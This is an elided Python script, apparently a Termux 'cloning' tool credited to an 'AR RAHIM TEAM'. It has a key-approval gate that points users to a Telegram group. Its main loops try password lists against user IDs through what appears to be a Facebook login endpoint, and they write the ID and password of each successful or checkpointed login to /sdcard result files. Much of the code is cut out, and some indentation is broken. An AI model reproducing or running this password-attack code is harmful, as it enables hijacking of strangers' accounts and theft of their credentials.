#===== SC SEND BY : RAHIM KING
#TELIGERM : AR RAHIM TEAM
...
def approval():
    ...
    if 'ON' in srvr:
        ...
        time.sleep(0.5)
        print(f'''{xd} TOOLS UPDATE DONE V{G}-{W}12.8.0''')
        time.sleep(0.5)
    if 'OFF' in srvr:
        os.system('clear')
        for i in range(20000):
            ...
            if key in req:
                ...
                print(f'''{xd} SEND KEY FOR AR RAHIM OWNER''')
                x = input(f'''{xd} PRESS ENTER TO ADMIN telegram group ''')
                os.system('xdg-open https://t.me/rahimking2034')
                exit()
    clear()
    print(f'''{xd} YOUR KEY {xdxx} {key} ''')
    print(f'''{xd} YOUR KEY NOT APPROVED ''')
    print(f'''{xd} SEND KEY FOR Ar_Rahim OWNER''')
...
logo = f"""
       {xd} {G}<\\> Script Creating BY - Ar Rahim King
...
def Fuck_SWAG():
    ...
    print('\x1b[1;37m')
    print(f'''\r{W}──────────────────────────────────────────────────''')
    print(f'''{xd} Salar BOINERE XUDA SESH''')
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                ...
                open('/sdcard/AR_Rahim-S1-FILE-OK-COKIE.txt', 'a').write(ids + '|' + pas + '\n')
                oks.append(ids)
                break
            if 'www.facebook.com' in po['error']['message']:
                print(f'''\r{G}➤{W}➤{Y} AR_Rahim-CP ''' + ids + ' | ' + pas + '\x1b[1;97m')
                open('/sdcard/AR_Rahim-S1-FILE-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(ids)
                break
            else:
                continue
    ...
    try:
        ...
        for pw in passlist:
		  ...
		  "Content-Type": "application/x-www-form-accencoded",
            ...
            if 'session_key' in po:
                print(f'\r{G}➤{W}➤{G} AR_Rahim-OK ' + ids + ' | ' + pas + '\x1b[1;97m')
                with open('/sdcard/AR_RAHIM-S2-FILE-OK-COKIE.txt', 'a') as f:
                    f.write(ids + '|' + pas + '\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po.get('error_msg', ''):
                print(f'\r{G}➤{W}➤{Y} AR_Rahim-CP ' + ids + ' | ' + pas + '\x1b[1;97m')
                with open('/sdcard/AR_Rahim-S2-FILE-CP.txt', 'a') as f:
                    f.write(ids + '|' + pas + '\n')
                cps.append(ids)
                break
            else:
    ...
    try:
        for pas in passlist:
            ...
            if 'session_key' in po:
                ...
                if 'LIVE' in response:
                    print(f'''\r{G}➤{W}➤{G} Fuck_SWAG-OK  {str(uid)} | {pas} ''')
                    open('/sdcard/Fuck_SWAG-S1-RNDM-OK.txt', 'a').write(str(uid) + '|' + pas + '\n')
                    oks.append(str(uid))
                    break
            if 'www.facebook.com' in po['error']['message']:
                uid = po['error']['error_data']['uid']
                print(f'''\r{G}➤{W}➤{Y} Fuck_SWAG-CP ''' + uid + ' | ' + pas + '\x1b[1;97m')
                open('/sdcard/Fuck_SWAG-S1-RNDM-CP.txt', 'a').write(str(uid) + '|' + pas + '\n')
                cps.append(str(uid))
                break
            else:
                continue
    ...
    try:
        for pas in passlist:
            ...
            if 'session_key' in po:
                ...
                if 'LIVE' in response:
                    print(f'''\r{G}➤{W}➤{G} Fuck_SWAG-OK  {str(uid)} | {pas} ''')
                    with open('/sdcard/AR_Rahim-S1-RNDM-OK.txt', 'a') as f:
                        f.write(str(uid) + '|' + pas + '\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in po['error']['message']:
                uid = po['error']['error_data']['uid']
                print(f'''\r{G}➤{W}➤{Y} AR_Rahim-CP ''' + uid + ' | ' + pas + '\x1b[1;97m')
                with open('/sdcard/AR_Rahim-S1-RNDM-CP.txt', 'a') as f:
                    f.write(str(uid) + '|' + pas + '\n')
                cps.append(str(uid))
                break
            else:
